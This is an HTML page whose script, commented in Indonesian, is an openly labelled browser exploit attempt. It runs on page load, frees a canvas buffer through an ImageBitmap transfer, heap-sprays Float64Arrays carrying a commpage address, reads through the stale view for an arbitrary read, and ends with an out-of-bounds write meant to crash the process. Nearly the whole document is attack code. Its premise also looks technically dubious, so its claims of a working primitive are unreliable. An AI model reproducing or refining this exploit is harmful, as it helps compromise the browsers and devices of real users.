<!DOCTYPE html>
<html>
<head>
    <title>ImageBitmap Transfer UAF Attack</title>
</head>
<body>

    <h1>ImageBitmap Transfer UAF (Final DOM-based Attack)</h1>
    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
    <p id="status">INIT: Mempersiapkan ImageBitmap Transfer UAF...</p>
    <div id="log-area"></div>

    <canvas id="victimCanvas" width="200" height="200"></canvas>
    
    <script>
        // --- KONSTANTA COMM PAGE ---
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const COMM_PAGE_ASB_TARGET_VALUE = COMM_PAGE64_BASE_ADDRESS + BigInt("0x320"); 
        
        const LOW_WORD = Number(COMM_PAGE_ASB_TARGET_VALUE & 0xFFFFFFFFn); 
        const HIGH_WORD = Number(COMM_PAGE_ASB_TARGET_VALUE >> 32n);

        let startTime = performance.now();
        let payloadHolders = []; 
        let victimImageData = null;

        function log(message, type = 'log-info') {
            const timeElapsed = (performance.now() - startTime).toFixed(2);
            const logElement = document.getElementById('log-area');
            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
            logElement.scrollTop = logElement.scrollHeight;
        }

        // --- FUNGSI HEAP SPRAY PAYLOAD ---
        function sprayPayload() {
            log("Memulai Spraying Payload (Float64Array)...", "log-spray");
            const SPRAY_COUNT = 3000;
            const PAYLOAD_SIZE = 64; 

            for (let i = 0; i < SPRAY_COUNT; i++) {
                let payloadArray = new Float64Array(PAYLOAD_SIZE);
                // Payload menimpa pointer data/metadata
                payloadArray[0] = HIGH_WORD; 
                payloadArray[1] = LOW_WORD;
                payloadHolders.push(payloadArray); 
            }
        }

        // --- FUNGSI UTAMA ATTACK ---
        function runImageBitmapAttack() {
            startTime = performance.now();
            log("Phase 1: Setup Canvas dan Context.", "log-init");

            const canvas = document.getElementById('victimCanvas');
            const ctx = canvas.getContext('2d');
            
            // Grooming: Alokasikan buffer data canvas (korban)
            ctx.fillStyle = 'red';
            ctx.fillRect(0, 0, 200, 200);
            
            // Dapatkan data buffer (yang merupakan korban UAF)
            victimImageData = ctx.getImageData(0, 0, 200, 200);
            const victimDataView = new Uint32Array(victimImageData.data.buffer);
            victimDataView[0] = 0xDEADBEEF; // Nilai penanda

            // 1. FREE (Async): Buat ImageBitmap dan Transfer.
            // ImageBitmap menyimpan pointer ke data canvas (korban). 
            createImageBitmap(canvas).then(imageBitmap => {
                log("Phase 2: ImageBitmap dibuat. Memicu FREE (Transfer).", "log-critical");
                
                // Memicu Transfer (FREE): mengirim ImageBitmap ke dirinya sendiri
                // Ini akan me-*free* data buffer internal C++ ImageBitmap/Canvas
                window.postMessage({ bitmap: imageBitmap }, '*', [imageBitmap]);

                // --- SPRAY SINKRON ---
                // Data buffer yang baru di-free harus segera ditimpa
                sprayPayload(); 
                log("Phase 3: SPRAY Commpage Payload SINKRON.", "log-critical");

                // --- TRIGGER ---
                // Coba akses data dari ImageData yang dibuat di awal
                // Pointer C++ di belakang victimDataView sekarang seharusnya corrupt
                setTimeout(() => {
                    log("Phase 4: Memicu Arbitrary Read pada ImageData yang Corrupt...", "log-critical");
                    
                    try {
                        // Baca data dari view yang menunjuk ke buffer yang di-free/ditimpa
                        const readHigh = victimDataView[0];
                        const readLow = victimDataView[1];
                        
                        log(`Nilai dibaca (High): 0x${readHigh.toString(16)}`, "log-critical");
                        log(`Nilai dibaca (Low): 0x${readLow.toString(16)}`, "log-critical");
                        
                        // Jika berhasil, nilai yang dibaca adalah payload Commpage
                        if (readHigh === HIGH_WORD) {
                             log("SUCCESS: Arbitrary Read primitif ImageBitmap UAF!", "log-success");
                        }
                        
                        // Trigger Final: OOB Write / Arbitrary Write
                        victimDataView[1000000] = 0x1234; // OOB Write yang seharusnya crash

                    } catch(e) {
                         log(`JS Exception: ${e.message} - Menunggu Crash OS (EXC_BAD_ACCESS)...`, "log-critical");
                    }
                }, 50);

            }).catch(e => {
                log(`Error: Gagal membuat ImageBitmap: ${e.message}`, "log-error");
            });
        }
        
        // Listener PostMessage (hanya untuk membersihkan event loop)
        window.onmessage = function(e) {
            if (e.data && e.data.bitmap) {
                 // ImageBitmap diterima dan dibuang (memastikan free terjadi)
                log("ImageBitmap diterima dan Transfer Selesai.", "log-info");
            }
        };

        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('status').textContent = 'Memulai rangkaian ImageBitmap UAF Attack...';
            setTimeout(runImageBitmapAttack, 50);
            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah ImageBitmap Transfer UAF.';
        });
    </script>
    <style>
        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
        .log-init { color: blue; }
        .log-info { color: black; }
        .log-spray { color: purple; }
        .log-critical { color: red; font-weight: bold; }
        .log-success { color: green; font-weight: bold; }
        .log-error { color: darkred; font-weight: bold; }
    </style>
</body>
</html>
